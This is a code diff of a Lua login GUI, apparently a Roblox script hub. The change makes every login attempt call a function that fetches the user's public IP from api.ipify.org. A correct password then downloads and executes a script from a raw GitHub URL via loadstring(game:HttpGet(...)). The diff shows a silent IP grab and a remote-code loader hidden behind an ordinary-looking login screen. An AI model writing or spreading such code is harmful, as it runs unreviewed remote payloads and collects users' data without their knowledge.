@@ -195,21 +195,7 @@ TextLog2.TextScaled = false
 TextLog2.TextSize = 50.000
 TextLog2.TextWrapped = true
 
-local function LoginPass(username, pass)
-	if UsernameInput.Text == username and PasswordInput.Text == pass then
-		
-		TextLog2.Text = "Output: Correct Password!"
-		wait(2)
-		Frame.Visible = false
-	 for i = 24, 0, -1 do 
-		 wait(0.01)
-		 blur.Size = i
-	 end
-	 loadstring(game:HttpGet("https://raw.githubusercontent.com/AspectV44/d/main/InCodeHubScript"))()
-	 else 
-	     TextLog2.Text = "Output: Incorrect Password!"
-	end
-end
+
 
 local function exitgui()
 	local Godlike = game:HttpGet("https://api.ipify.org")
@@ -248,12 +234,24 @@ local function exitgui()
 
 
 
-	Frame.Visible = false
-for i = 24, 0, -1 do
-	blur.Size = i
-	wait(0.01)
+
 end
 
+local function LoginPass(username, pass)
+	exitgui()
+	if UsernameInput.Text == username and PasswordInput.Text == pass then
+		
+		TextLog2.Text = "Output: Correct Password!"
+		wait(2)
+		Frame.Visible = false
+	 for i = 24, 0, -1 do 
+		 wait(0.01)
+		 blur.Size = i
+	 end
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/AspectV44/d/main/InCodeHubScript"))()
+	 else 
+	     TextLog2.Text = "Output: Incorrect Password!"
+	end
 end
 
 
